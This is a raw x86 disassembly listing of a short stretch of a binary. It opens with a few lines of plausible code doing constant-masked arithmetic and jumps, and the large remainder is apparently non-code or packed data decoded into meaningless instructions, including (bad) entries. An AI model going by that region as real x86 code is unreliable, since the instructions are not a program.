  41c07c:	mov    WORD PTR [esp+0xc],cx
  41c081:	mov    cx,WORD PTR [esp+0xc]
  41c086:	sub    cx,dx
  41c089:	mov    dx,WORD PTR [esp+0x24]
  41c08e:	xor    cx,dx
  41c091:	mov    dx,WORD PTR [esp+0x2c]
  41c096:	imul   cx,dx
  41c09a:	mov    dx,WORD PTR [esp+0x38]
  41c09f:	and    cx,dx
  41c0a2:	mov    edx,0x694c
  41c0a7:	and    cx,dx
  41c0aa:	mov    dx,WORD PTR [esp+0x3c]
  41c0af:	cmp    dx,cx
  41c0b2:	ja     0x41c888
  41c0b8:	mov    ecx,DWORD PTR [esp+0x18]
  41c0bc:	mov    edx,DWORD PTR [esp+0x1c]
  41c0c0:	shrd   ecx,edx,0x2
  41c0c4:	xor    ecx,eax
  41c0c6:	mov    eax,DWORD PTR [esp+0x18]
  41c0ca:	shr    edx,0x2
  41c0cd:	mov    edx,DWORD PTR [esp+0x1c]
  41c0d1:	xor    edx,edx
  41c0d3:	or     edx,ecx
  41c0d5:	push   edx
  41c0d6:	push   esi
  41c0d7:	shl    eax,0x1e
  41c0da:	push   edi
  41c0db:	lea    eax,[esp+0x7c]
  41c0df:	push   eax
  41c0e0:	lea    eax,[esp+0x28]
  41c0e4:	push   eax
  41c0e5:	jmp    0x41c4b4
  41c0ea:	in     eax,0x66
  41c0ec:	sar    BYTE PTR [ebx],1
  41c0ee:	dec    edx
  41c0ef:	sbb    esp,DWORD PTR [edx+0x1e]
  41c0f2:	icebp  
  41c0f3:	scas   eax,DWORD PTR es:[edi]
  41c0f4:	mov    ch,0x7c
  41c0f6:	ret    0x6311
  41c0f9:	mov    esp,0x181679a7
  41c0fe:	mov    esp,0x18181812
  41c103:	add    DWORD PTR [ecx-0x21],ecx
  41c106:	lods   al,BYTE PTR ds:[esi]
  41c107:	out    0xdf,al
  41c109:	mov    edx,0x26cacd6d
  41c10e:	xor    eax,0x26454f67
  41c113:	sti    
  41c114:	mov    BYTE PTR [edx-0x15],bl
  41c117:	je     0x41c0d9
  41c119:	icebp  
  41c11a:	push   0x5e
  41c11c:	jo     0x41c114
  41c11e:	pop    ds
  41c11f:	sbb    BYTE PTR [eax-0x610389a1],ch
  41c125:	push   ebx
  41c126:	fcomp  DWORD PTR [ecx]
  41c128:	pop    esp
  41c129:	jmp    0x41c0d7
  41c12b:	jp     0x41c0af
  41c12d:	push   esi
  41c12e:	mov    edx,0x56bff5ec
  41c133:	loop   0x41c178
  41c135:	ds arpl si,ax
  41c138:	cmp    eax,0x47d978d3
  41c13d:	pop    edi
  41c13e:	mov    edx,0x2cd3e535
  41c143:	in     al,0x26
  41c145:	rcr    ch,cl
  41c147:	or     DWORD PTR ds:0xfc7ddb17,ecx
  41c14d:	lock mov dh,0x5
  41c150:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c151:	sbb    esi,0xfffffffc
  41c154:	fisubr DWORD PTR [edx+0x2b]
  41c157:	popa   
  41c158:	mov    BYTE PTR [ecx],ch
  41c15a:	xchg   esp,eax
  41c15b:	retf   
  41c15c:	mov    al,ah
  41c15e:	fnstenv [eax]
  41c160:	jns    0x41c183
  41c162:	icebp  
  41c163:	ss cmp bl,dh
  41c166:	push   ss
  41c167:	push   ebp
  41c168:	dec    ebp
  41c169:	adc    BYTE PTR [esi+eax*1-0x59cbceed],0x9a
  41c171:	dec    eax
  41c172:	in     eax,0xe7
  41c174:	into   
  41c175:	cmp    al,0x0
  41c177:	inc    ebp
  41c178:	inc    eax
  41c179:	sbb    al,BYTE PTR [ecx-0x5fe0be22]
  41c17f:	add    esi,DWORD PTR [edi+0x7e9bba80]
  41c185:	or     ecx,edx
  41c187:	or     eax,0x3f3a8e51
  41c18c:	test   eax,0xda658e7d
  41c191:	aad    0x64
  41c193:	xchg   ebx,eax
  41c194:	mov    eax,0xc5a17f
  41c199:	dec    ecx
  41c19a:	mov    eax,eax
  41c19c:	mov    edx,0x3362e2e
  41c1a1:	scas   al,BYTE PTR es:[edi]
  41c1a2:	outs   dx,DWORD PTR ds:[esi]
  41c1a3:	jmp    DWORD PTR [ecx]
  41c1a5:	lahf   
  41c1a6:	ins    BYTE PTR es:[edi],dx
  41c1a7:	iret   
  41c1a8:	ds jmp 0x251d:0x4def5bad
  41c1b0:	adc    ecx,DWORD PTR [eax+0x45]
  41c1b3:	test   al,0xdc
  41c1b5:	or     BYTE PTR [edi-0x27],0xd0
  41c1b9:	(bad)  [ebx+0x49]
  41c1bc:	pop    ebx
  41c1bd:	mov    esi,0xcc581a32
  41c1c2:	repz ds push 0x119206b9
  41c1c9:	sbb    cl,BYTE PTR [ebp+0x67]
  41c1cc:	xchg   ebp,eax
  41c1cd:	outs   dx,BYTE PTR ds:[esi]
  41c1ce:	(bad)  
  41c1cf:	cwde   
  41c1d0:	ss mov ch,0x4f
  41c1d3:	enter  0x7931,0xb4
  41c1d7:	outs   dx,DWORD PTR ds:[esi]
  41c1d8:	mov    bl,0x77
  41c1da:	dec    ecx
  41c1db:	popa   
  41c1dc:	dec    esi
  41c1dd:	fisubr WORD PTR [ecx-0x60d107ec]
  41c1e3:	mov    DWORD PTR [edx-0x54cc1557],edx
  41c1e9:	repz aam 0x7c
  41c1ec:	int3   
  41c1ed:	dec    edx
  41c1ee:	push   ecx
  41c1ef:	or     eax,DWORD PTR [esi+edi*4+0x72]
  41c1f3:	dec    esi
  41c1f4:	(bad)  
  41c1f5:	jmp    0x6363963
  41c1fa:	xchg   esi,eax
  41c1fb:	sub    DWORD PTR [eax-0x5e],edx
  41c1fe:	mov    dh,0xc7
  41c200:	inc    esp
  41c201:	sub    BYTE PTR [edi+0x73],bl
  41c204:	push   ds
  41c205:	pop    eax
  41c206:	xor    eax,0xc2e3fd8e
  41c20b:	fstp   DWORD PTR [esp+esi*1]
  41c20e:	fcom   QWORD PTR [ebp+0x7b25ecde]
  41c214:	jb     0x41c228
  41c216:	mov    edx,0x1c775a15
  41c21b:	test   DWORD PTR [esp+eax*1-0x7],ecx
  41c21f:	push   eax
  41c220:	jge    0x41c206
  41c222:	xor    eax,0x5e834ea6
  41c227:	sti    
  41c228:	mov    eax,DWORD PTR [ebp-0x56]
  41c22b:	fidiv  DWORD PTR [ecx+edi*8-0x5e675639]
  41c232:	fcom   QWORD PTR [edi+0x7b026129]
  41c238:	xchg   esp,eax
  41c239:	push   0xf43030c6
  41c23e:	repnz jecxz 0x41c2a4
  41c241:	cmp    eax,0xd0a7968
  41c246:	mov    eax,0x4ff6a8a5
  41c24b:	push   edi
  41c24c:	adc    DWORD PTR [ebx-0x53],0x5fc0669b
  41c253:	mov    edx,0x26a1fd52
  41c258:	jg     0x41c204
  41c25a:	add    eax,0x8321ebef
  41c25f:	pop    ebp
  41c260:	xor    BYTE PTR [esi-0x511abe91],bl
  41c266:	push   edx
  41c267:	jb     0x41c262
  41c269:	loop   0x41c2d0
  41c26b:	call   0x7bd0:0xfee9e65d
  41c272:	jle    0x41c2d3
  41c274:	daa    
  41c275:	les    ebp,FWORD PTR [ecx-0x7d41185e]
  41c27b:	mov    al,BYTE PTR [eax]
  41c27d:	loop   0x41c235
  41c27f:	addr16 xor al,0x5
  41c282:	mov    esi,0x3172318e
  41c287:	sbb    cl,BYTE PTR [ecx+0x621940c9]
  41c28d:	in     al,dx
  41c28e:	mov    eax,ds:0xc0d855a
  41c293:	xor    esi,0xa5d2e87e
  41c299:	lahf   
  41c29a:	lods   eax,DWORD PTR ds:[esi]
  41c29b:	pop    edi
  41c29c:	pusha  
  41c29d:	push   ds
  41c29e:	outs   dx,BYTE PTR ds:[esi]
  41c29f:	sbb    ebx,DWORD PTR [ebx]
  41c2a1:	mov    dl,0x1f
  41c2a3:	mov    al,0xf0
  41c2a5:	cmp    eax,0x7b11c00a
  41c2aa:	mov    esi,0x1222f94e
  41c2af:	push   edi
  41c2b0:	adc    dl,0x0
  41c2b3:	push   esp
  41c2b4:	adc    DWORD PTR [eax],ebp
  41c2b6:	inc    edx
  41c2b7:	mov    bl,0x67
  41c2b9:	adc    ch,BYTE PTR [ebp+0x63]
  41c2bc:	ss out dx,eax
  41c2be:	dec    eax
  41c2bf:	out    dx,eax
  41c2c0:	dec    DWORD PTR [ebp-0xb81c9c8]
  41c2c6:	add    al,0x2e
  41c2c8:	(bad)  
  41c2c9:	pop    edx
  41c2ca:	sbb    ecx,DWORD PTR [ebx-0x1c6b0807]
  41c2d0:	les    eax,FWORD PTR [ebp-0xffc909e]
  41c2d6:	retf   0xcb78
  41c2d9:	repz push esi
  41c2db:	(bad)  
  41c2dc:	fild   WORD PTR [edi+esi*8]
  41c2df:	mov    al,ds:0x5ecabe5a
  41c2e4:	loopne 0x41c331
  41c2e6:	push   cs
  41c2e7:	inc    esi
  41c2e8:	ret    0x1e5d
  41c2eb:	iret   
  41c2ec:	cmp    dh,ch
  41c2ee:	sbb    al,0xf5
  41c2f0:	fwait
  41c2f1:	push   ebx
  41c2f2:	sub    al,0x36
  41c2f4:	not    DWORD PTR [esi+ebp*4+0x753ed7fa]
  41c2fb:	leave  
  41c2fc:	dec    esi
  41c2fd:	inc    ebx
  41c2fe:	push   cs
  41c2ff:	leave  
  41c300:	cld    
  41c301:	cmp    eax,0xf6a2a3d9
  41c306:	adc    ebp,esi
  41c308:	jo     0x41c2da
  41c30a:	sbb    ebx,DWORD PTR [ebp-0x9b4941c]
  41c310:	adc    dl,BYTE PTR [esi-0x37]
  41c313:	leave  
  41c314:	mov    al,ds:0xee600a5b
  41c319:	push   ss
  41c31a:	jne    0x41c31e
  41c31c:	arpl   WORD PTR [ecx+0x5e3ef673],bp
  41c322:	jno    0x41c31e
  41c324:	push   ebp
  41c325:	adc    BYTE PTR [eax-0x17],0xb4
  41c329:	(bad)  
  41c32a:	and    DWORD PTR [eax-0x1f],esp
  41c32d:	retf   0xc8a0
  41c330:	xchg   ebx,eax
  41c331:	add    dh,BYTE PTR [edx+0x4f]
  41c334:	push   ds
  41c335:	inc    ebp
  41c336:	push   ebp
  41c337:	stos   DWORD PTR es:[edi],eax
  41c338:	fisub  WORD PTR [ecx-0x1a]
  41c33b:	jmp    DWORD PTR [ebp+0x1]
  41c33e:	jmp    0xfab50626
  41c343:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c345:	mov    eax,ds:0x234f38af
  41c34a:	scas   eax,DWORD PTR es:[edi]
  41c34b:	push   ds
  41c34c:	mov    eax,0x2a0080b7
  41c351:	dec    esi
  41c352:	test   eax,0x65e5f59c
  41c357:	stc    
  41c358:	jmp    0x41c325
  41c35a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c35b:	in     eax,0x36
  41c35d:	push   0xffffffb3
  41c35f:	xor    al,0xa2
  41c361:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c362:	jns    0x41c3cd
  41c364:	dec    edi
  41c365:	push   edi
  41c366:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c367:	outs   dx,BYTE PTR ds:[esi]
  41c368:	mov    esp,0x8ee59dd8
  41c36d:	lods   eax,DWORD PTR ds:[esi]
  41c36e:	push   edi
  41c36f:	mov    eax,0x8dd84e91
  41c374:	loope  0x41c3da
  41c376:	cmp    esp,edx
  41c378:	ds push ebp
  41c37a:	nop
  41c37b:	mov    ah,0x89
  41c37d:	mov    bl,0xd1
  41c37f:	push   eax
  41c380:	cmp    bl,ah
  41c382:	dec    eax
  41c383:	ins    BYTE PTR es:[edi],dx
  41c384:	pop    ecx
  41c385:	ffreep st(2)
  41c387:	cmp    ecx,DWORD PTR [eax]
  41c389:	mov    bh,0x71
  41c38b:	or     ch,BYTE PTR [ebx+0x860e4e1]
  41c391:	add    eax,0xef67e40a
  41c396:	xor    BYTE PTR [edx+0x14],ah
  41c399:	jmp    0x41c3dd
  41c39b:	mov    ds:0x76a2fb17,eax
  41c3a0:	lds    esi,FWORD PTR [edx-0x79e2b757]
  41c3a6:	jbe    0x41c3b6
  41c3a8:	add    al,0xa0
  41c3aa:	add    DWORD PTR [edi],edi
  41c3ac:	retf   
  41c3ad:	iret   
  41c3ae:	and    BYTE PTR [esi],al
  41c3b0:	or     ah,BYTE PTR [edi+0x50]
  41c3b3:	mov    bh,0xe2
  41c3b5:	es cwde 
  41c3b7:	shl    DWORD PTR [ecx-0x2c],cl
  41c3ba:	sub    eax,0xc5073ae0
  41c3bf:	iret   
  41c3c0:	cmp    ah,BYTE PTR [edi]
  41c3c2:	(bad)  [esi+0x2e]
  41c3c5:	leave  
  41c3c6:	cmp    al,0x48
  41c3c8:	inc    edi
  41c3c9:	mov    dh,BYTE PTR [ecx]
  41c3cb:	mov    bh,0xc1
  41c3cd:	pop    es
  41c3ce:	cwde   
  41c3cf:	mov    edx,0x1816f199
  41c3d4:	(bad)  
  41c3d5:	sub    cl,BYTE PTR [edi]
  41c3d7:	pop    ecx
  41c3d8:	(bad)  
  41c3d9:	xchg   ebp,eax
  41c3da:	pop    es
  41c3db:	ret    
  41c3dc:	cmp    eax,0xbbf5a5b8
  41c3e1:	dec    DWORD PTR [eax-0x303dc03b]
  41c3e7:	popf   
  41c3e8:	pop    esp
  41c3e9:	dec    edi
  41c3ea:	jmp    0x406d5da7
  41c3ef:	xchg   ecx,eax
  41c3f0:	ror    BYTE PTR [edi+0xd],1
  41c3f3:	shl    BYTE PTR [esi+ebp*8],1
  41c3f6:	test   eax,0xb87b6902
  41c3fb:	and    BYTE PTR [edi-0x7],al
  41c3fe:	mov    ecx,es
  41c400:	ss pop esp
  41c402:	shr    DWORD PTR [ebx+eax*8+0x1a],cl
  41c406:	push   ss
  41c407:	push   0xc0ad47d3
  41c40c:	inc    eax
  41c40d:	bound  ebp,QWORD PTR [edi+edi*1-0x6f]
  41c411:	out    dx,al
  41c412:	jbe    0x41c45c
  41c414:	mov    ds:0xd92d66f1,eax
  41c419:	push   edi
  41c41a:	cld    
  41c41b:	into   
  41c41c:	imul   edx,DWORD PTR [ebx],0x7db69a4f
  41c422:	xchg   ecx,eax
  41c423:	mov    ecx,0x3f21cf43
  41c428:	fisttp DWORD PTR [ecx+0x2d1b18da]
  41c42e:	xchg   edi,eax
  41c42f:	out    0x2b,eax
  41c431:	adc    esp,ecx
  41c433:	popf   
  41c434:	xor    DWORD PTR [edi+edx*1-0x5a],eax
  41c438:	jae    0x41c476
  41c43a:	shr    ebx,cl
  41c43c:	test   eax,0xbc3d381f
  41c441:	fs push eax
  41c443:	xchg   ecx,eax
  41c444:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c445:	call   0x1ddb:0x46719ae7
  41c44c:	ds sahf 
  41c44e:	ins    BYTE PTR es:[edi],dx
  41c44f:	jge    0x41c4bd
  41c451:	jmp    0xc8297cb7
  41c456:	icebp  
  41c457:	fcomp  DWORD PTR [eax]
  41c459:	arpl   WORD PTR [ecx-0x1a],bx
  41c45c:	jns    0x41c4d2
  41c45e:	hlt    
  41c45f:	mov    edi,0x307c9d88
  41c464:	xor    edx,DWORD PTR ds:0x6eb99802
  41c46a:	or     eax,0xc36ba0aa
  41c46f:	dec    ebx
  41c470:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41c472:	dec    esi
  41c473:	add    ecx,edi
  41c475:	stos   DWORD PTR es:[edi],eax
  41c476:	pop    ebp
  41c477:	repz lea esi,[ebp+0x56a0bbfa]
  41c47e:	cmc    
  41c47f:	mov    ecx,0x2c38b735
  41c484:	(bad)  [edx+ecx*2+0x2f2a42a]
  41c48b:	dec    edi
  41c48c:	and    BYTE PTR [ebp-0x2d7979ab],ch
  41c492:	mov    ds:0x9579665e,al
  41c497:	inc    ecx
  41c498:	and    BYTE PTR [esi+0x16],al
  41c49b:	xchg   esp,eax
  41c49c:	out    dx,eax
  41c49d:	inc    ecx
  41c49e:	aaa    
  41c49f:	dec    edx
  41c4a0:	les    edx,FWORD PTR [edx]
  41c4a2:	add    esi,DWORD PTR [ebx+0x26c9bb84]
  41c4a8:	or     ebp,DWORD PTR [edi+esi*8-0x23]
  41c4ac:	retf   0x4572
  41c4af:	dec    edi
  41c4b0:	ss icebp 
  41c4b2:	push   esi
  41c4b3:	aas    
  41c4b4:	call   0x414dd5
  41c4b9:	jmp    0x41c888
  41c4be:	inc    edi
  41c4bf:	and    edi,DWORD PTR [eax]
  41c4c1:	sbb    DWORD PTR [ebx+eax*1],esi
  41c4c4:	daa    
  41c4c5:	and    cl,BYTE PTR [ebx]
  41c4c7:	cdq    
  41c4c8:	lahf   
  41c4c9:	jo     0x41c4a5
  41c4cb:	in     al,dx
  41c4cc:	outs   dx,DWORD PTR ds:[esi]
  41c4cd:	mov    al,0x4a
  41c4cf:	jae    0x41c4e7
  41c4d1:	sbb    BYTE PTR [edx+edx*1-0x6f87e7e8],bh
  41c4d8:	jne    0x41c509
  41c4da:	arpl   WORD PTR ds:[edx-0x1aa8db1e],cx
  41c4e1:	mov    cs,WORD PTR [edx+0x5be6b31c]
  41c4e7:	mov    eax,ds:0x21102d37
  41c4ec:	icebp  
  41c4ed:	aas    
  41c4ee:	int3   
  41c4ef:	sbb    bh,dl
  41c4f1:	ss lahf 
  41c4f3:	icebp  
  41c4f4:	mov    ecx,0xdd849c7a
  41c4f9:	ins    DWORD PTR es:[edi],dx
  41c4fa:	es ret 
  41c4fc:	fs scas eax,DWORD PTR es:[edi]
  41c4fe:	mov    esp,0xd44a48b1
  41c503:	xchg   esp,eax
  41c504:	stos   DWORD PTR es:[edi],eax
  41c505:	mov    edi,0x98fefd5a
  41c50a:	add    DWORD PTR [edx-0x2208cb53],edi
  41c510:	push   ebp
  41c511:	fucom  st(5)
  41c513:	push   ebp
  41c514:	xor    al,0x40
  41c516:	or     al,0x50
  41c518:	and    esi,DWORD PTR ds:0xa6a7f191
  41c51e:	sar    BYTE PTR ds:0xbd07f3c9,0xc2
  41c525:	push   cs
  41c526:	sbb    esp,esp
  41c528:	das    
  41c529:	mov    al,ds:0xb8727ff5
  41c52e:	(bad)  
  41c52f:	sub    eax,0xc51f32e5
  41c534:	lods   al,BYTE PTR ds:[esi]
  41c535:	ret    
  41c536:	mov    ch,0xf5
  41c538:	jp     0x41c554
  41c53a:	test   al,0x1c
  41c53c:	push   cs
  41c53d:	sub    eax,DWORD PTR [edx]
  41c53f:	mov    edi,0x6975b005
  41c544:	add    eax,0x5b2ed02b
  41c549:	in     al,0x85
  41c54b:	ret    
  41c54c:	test   eax,0x5db5d425
  41c551:	push   esp
  41c552:	adc    DWORD PTR ds:0xfaff82cf,0xd7e8c937
  41c55c:	cmp    al,0x1a
  41c55e:	and    DWORD PTR [eax],eax
  41c560:	dec    ecx
  41c561:	mov    BYTE PTR [esi-0x6b257f9d],0x57
  41c568:	jae    0x41c537
  41c56a:	les    ecx,FWORD PTR [eax+esi*4-0x3d]
  41c56e:	and    edi,esi
  41c570:	jmp    0xb5f4:0x6279bff3
  41c577:	sbb    al,0x8c
  41c579:	push   ebp
  41c57a:	dec    ebp
  41c57b:	in     al,dx
  41c57c:	add    al,0x9d
  41c57e:	shl    DWORD PTR [edi-0x3e],0x15
  41c582:	clc    
  41c583:	lods   al,BYTE PTR ds:[esi]
  41c584:	sbb    bh,al
  41c586:	shl    BYTE PTR [ecx-0x4eae6d18],cl
  41c58c:	xor    DWORD PTR [edx+0x17faf622],edi
  41c592:	dec    edx
  41c593:	mov    BYTE PTR [ebx*8-0x4cf904a1],ah
  41c59a:	jmp    0x9bd:0xf0c20f41
  41c5a1:	imul   eax,DWORD PTR [ebx+ecx*2+0x8],0x76634981
  41c5a9:	aaa    
  41c5aa:	cmp    esp,DWORD PTR [ebx+eax*8-0x47fc6722]
  41c5b1:	lods   eax,DWORD PTR ds:[esi]
  41c5b2:	in     al,dx
  41c5b3:	sub    DWORD PTR [edx-0x7c],0x16
  41c5b7:	push   esi
  41c5b8:	loope  0x41c600
  41c5ba:	sbb    dh,dh
  41c5bc:	adc    DWORD PTR [ebx-0x3d],ebx
  41c5bf:	int3   
  41c5c0:	rcr    edi,0xca
  41c5c3:	inc    esi
  41c5c4:	or     al,0x4f
  41c5c6:	cmp    DWORD PTR [edx+0x59],0x9395aada
  41c5cd:	out    0xe9,al
  41c5cf:	ds hlt 
  41c5d1:	dec    eax
  41c5d2:	and    al,0xae
  41c5d4:	out    0xce,al
  41c5d6:	mov    fs,WORD PTR [edi+edx*2]
  41c5d9:	out    0x2f,al
  41c5db:	aas    
  41c5dc:	in     eax,0xe6
  41c5de:	out    0x27,eax
  41c5e0:	test   DWORD PTR [edi],ecx
  41c5e2:	inc    ebx
  41c5e3:	daa    
  41c5e4:	sub    BYTE PTR [ebx+ebp*4+0x216f208b],dh
  41c5eb:	sbb    DWORD PTR [edx+0x25],esi
  41c5ee:	int3   
  41c5ef:	std    
  41c5f0:	mov    edx,0xd4cefea9
  41c5f5:	daa    
  41c5f6:	(bad)
  41c5f9:	cmp    bh,ch
  41c5fb:	bound  edx,QWORD PTR [ebx+eax*4-0x15]
  41c5ff:	icebp  
  41c600:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c601:	js     0x41c609
  41c603:	gs dec edi
  41c605:	(bad)  
  41c606:	(bad)  
  41c607:	(bad)  
  41c609:	jnp    0x41c59d
  41c60b:	pop    ss
  41c60c:	jb     0x41c64d
  41c60e:	out    dx,al
  41c60f:	sar    BYTE PTR [ebp-0x2f],cl
  41c612:	or     BYTE PTR [esi+0x0],bl
  41c615:	sbb    edi,DWORD PTR [ebp+0x53]
  41c618:	pop    ecx
  41c619:	jne    0x41c646
  41c61b:	outs   dx,BYTE PTR ds:[esi]
  41c61c:	xchg   DWORD PTR [eax],ebp
  41c61e:	rcl    BYTE PTR [edi],1
  41c620:	inc    ebx
  41c621:	test   eax,0x611b02f0
  41c626:	(bad)
  41c629:	and    BYTE PTR [edi+0x15],ah
  41c62c:	pop    edx
  41c62d:	in     al,0xad
  41c62f:	adc    eax,0x8803c81a
  41c634:	gs ss cld 
  41c637:	xchg   ebx,eax
  41c638:	(bad)  [esi-0x62]
  41c63b:	add    BYTE PTR ss:[ecx],bh
  41c63e:	xor    eax,0xa7886632
  41c643:	fild   WORD PTR [edx-0x3712412f]
  41c649:	int    0x37
  41c64b:	aam    0xee
  41c64d:	mov    WORD PTR [esi],gs
  41c64f:	adc    cl,bl
  41c651:	ss xor al,0xea
  41c654:	test   al,0xe7
  41c656:	mov    al,ds:0xa13c8c56
  41c65b:	inc    eax
  41c65c:	and    bh,BYTE PTR [edi-0x32]
  41c65f:	pop    es
  41c660:	lock mov ah,0xb3
  41c663:	push   ebp
  41c664:	or     BYTE PTR [edx+0x42],cl
  41c667:	jle    0x41c668
  41c669:	adc    BYTE PTR [esi],0x3c
  41c66c:	add    ebx,DWORD PTR [ecx-0x1f]
  41c66f:	(bad)
  41c672:	jae    0x41c672
  41c674:	mov    ?,esi
  41c676:	into   
  41c677:	and    DWORD PTR [eax],esi
  41c679:	outs   dx,DWORD PTR ds:[esi]
  41c67a:	cmp    al,dh
  41c67c:	sub    esi,0x1653df8d
  41c682:	add    esi,0xf4301540
  41c688:	mov    edi,DWORD PTR [esi-0x6a]
  41c68b:	jecxz  0x41c674
  41c68d:	test   al,0xb8
  41c68f:	push   ebx
  41c690:	std    
  41c691:	or     DWORD PTR [edi],eax
  41c693:	or     al,0x5b
  41c695:	(bad)  
  41c696:	into   
  41c697:	mov    eax,ds:0x37d1c0e
  41c69c:	imul   ecx,DWORD PTR [edx+0x29],0xe57a1404
  41c6a3:	jmp    0xea09:0x44c17f40
  41c6aa:	(bad)  
  41c6ab:	(bad)  
  41c6ac:	xlat   BYTE PTR ds:[ebx]
  41c6ad:	add    esp,DWORD PTR [esi+0x5]
  41c6b0:	call   0x17559a01
  41c6b5:	jecxz  0x41c6b1
  41c6b7:	inc    esi
  41c6b8:	aas    
  41c6b9:	jnp    0x41c6c6
  41c6bb:	inc    DWORD PTR [edi+0x3eba6757]
  41c6c1:	(bad)  
  41c6c3:	dec    eax
  41c6c4:	dec    ebx
  41c6c5:	fwait
  41c6c6:	mov    bl,BYTE PTR [esi+eiz*2+0x8]
  41c6ca:	aam    0x35
  41c6cc:	push   esi
  41c6cd:	lods   eax,DWORD PTR ds:[esi]
  41c6ce:	push   edi
  41c6cf:	jae    0x41c658
  41c6d1:	cmp    ah,BYTE PTR [eax]
  41c6d3:	inc    esi
  41c6d4:	mov    ebx,0xa788246d
  41c6d9:	aaa    
  41c6da:	add    DWORD PTR [edi+0x645264ca],ecx
  41c6e0:	adc    BYTE PTR [edi],ch
  41c6e2:	xchg   BYTE PTR [edx],cl
  41c6e4:	cmp    DWORD PTR [edx-0x4aa4088d],ecx
  41c6ea:	push   DWORD PTR [ecx-0x54]
  41c6ed:	mov    esp,0xbabdb2ba
  41c6f2:	std    
  41c6f3:	cmp    DWORD PTR [edx-0xbd1854f],edi
  41c6f9:	loopne 0x41c6e8
  41c6fb:	sahf   
  41c6fc:	xor    al,0x9a
  41c6fe:	sbb    ebp,ecx
  41c700:	fnsave [ebx+ebx*2-0x61e21b3]
  41c707:	sub    eax,0xff14021b
  41c70c:	out    dx,al
  41c70d:	mov    ah,0x8e
  41c70f:	inc    ebx
  41c710:	push   es
  41c711:	outs   dx,BYTE PTR ds:[esi]
  41c712:	push   ebx
  41c713:	mov    es,WORD PTR [ebp+0x1d7f74fd]
  41c719:	xor    BYTE PTR [ebx-0x638dccea],bl
  41c71f:	icebp  
  41c720:	(bad)  
  41c721:	lods   al,BYTE PTR ds:[esi]
  41c722:	adc    DWORD PTR [ecx+eiz*2],0xffffffe0
  41c726:	scas   eax,DWORD PTR es:[edi]
  41c727:	xchg   ecx,eax
  41c728:	mov    eax,ds:0xddb5ef60
  41c72d:	adc    al,0x1e
  41c72f:	add    BYTE PTR [edx+0xb],dl
  41c732:	mov    ebp,0x3c7fe54e
  41c737:	mov    DWORD PTR [edi-0x138a6f34],esp
  41c73d:	cdq    
  41c73e:	sti    
  41c73f:	fnstcw WORD PTR [edx+0x66]
  41c742:	(bad)  
  41c743:	adc    eax,0x5dc04d81
  41c748:	aad    0x90
  41c74a:	cwde   
  41c74b:	jne    0x41c73e
  41c74d:	xchg   edi,eax
  41c74e:	adc    DWORD PTR [edx],esi
  41c750:	out    0xf0,eax
  41c752:	cs ins DWORD PTR es:[edi],dx
  41c754:	jp     0x41c6da
  41c756:	scas   eax,DWORD PTR es:[edi]
  41c757:	jecxz  0x41c7c2
  41c759:	inc    eax
  41c75a:	xor    al,0xe2
  41c75c:	pop    ecx
  41c75d:	xchg   DWORD PTR [ebx],esi
  41c75f:	adc    BYTE PTR [ebx-0x9],bh
  41c762:	pushf  
  41c763:	cmp    eax,0xba55b618
  41c768:	fadd   DWORD PTR [edx]
  41c76a:	iret   
  41c76b:	es cmp eax,0xbb19cb50
  41c771:	ins    BYTE PTR es:[edi],dx
  41c772:	ins    DWORD PTR es:[edi],dx
  41c773:	inc    edx
  41c774:	pushf  
  41c775:	(bad)  
  41c776:	push   ebp
  41c777:	lahf   
  41c778:	or     DWORD PTR [esi-0x1b],0xa9851b22
  41c77f:	mov    ds:0xcc977ad4,al
  41c784:	into   
  41c785:	mov    BYTE PTR [ebp-0xd0a91fc],dh
  41c78b:	ror    DWORD PTR [eax+0x77],0x68
  41c78f:	scas   al,BYTE PTR es:[edi]
  41c790:	push   ecx
  41c791:	inc    ebp
  41c792:	mov    edx,0x93c07c48
  41c797:	adc    eax,0x809c5be0
  41c79c:	cmp    eax,0x1b752388
  41c7a1:	xchg   edi,eax
  41c7a2:	cli    
  41c7a3:	mov    WORD PTR [ecx-0xda643a3],es
  41c7a9:	mov    fs,ebp
  41c7ab:	pop    ebp
  41c7ac:	add    bl,dl
  41c7ae:	mov    DWORD PTR [ebx-0x774f122a],ebx
  41c7b4:	cmp    al,0xfb
  41c7b6:	sub    al,0x2a
  41c7b8:	xchg   esi,eax
  41c7b9:	es pop ss
  41c7bb:	lods   eax,DWORD PTR ds:[esi]
  41c7bc:	sub    BYTE PTR [ecx],cl
  41c7be:	sub    BYTE PTR [ebp+0x71933986],ch
  41c7c4:	inc    edi
  41c7c5:	mov    ch,0x19
  41c7c7:	fiadd  DWORD PTR ss:[ecx]
  41c7ca:	icebp  
  41c7cb:	pop    edi
  41c7cc:	retf   0x558
  41c7cf:	(bad)  
  41c7d0:	mov    eax,ds:0x192ceb86
  41c7d5:	enter  0xa459,0xa2
  41c7d9:	pop    ds
  41c7da:	xor    ebp,esi
  41c7dc:	pop    esi
  41c7dd:	adc    DWORD PTR [eax],0xffffff80
  41c7e0:	pop    ebp
  41c7e1:	aas    
  41c7e2:	cmp    BYTE PTR [edi-0x1656cd23],cl
  41c7e8:	sbb    eax,edi
  41c7ea:	stos   DWORD PTR es:[edi],eax
  41c7eb:	xor    eax,edx
  41c7ed:	jp     0x41c7bc
  41c7ef:	loopne 0x41c7d6
  41c7f1:	ja     0x41c82f
  41c7f3:	loopne 0x41c7af
  41c7f5:	fstp   DWORD PTR [ebp-0x67e8f487]
  41c7fb:	ja     0x41c82c
  41c7fd:	dec    eax
  41c7fe:	add    dh,BYTE PTR [edx]
  41c800:	and    ebp,DWORD PTR [ecx-0x7d]
  41c803:	push   0xf5020cec
  41c808:	icebp  
  41c809:	adc    ebx,eax
  41c80b:	retf   0x59a2
  41c80e:	sbb    eax,0x5d4ab753
  41c813:	sub    al,0x45
  41c815:	in     al,0x61
  41c817:	retf   
  41c818:	aas    
  41c819:	sub    al,BYTE PTR [ebp+0x2979c350]
  41c81f:	jne    0x41c827
  41c821:	xor    BYTE PTR [edx+0x1c79282e],ch
  41c827:	cmp    ebx,DWORD PTR [ebx+0x1a]
  41c82a:	and    al,0xbb
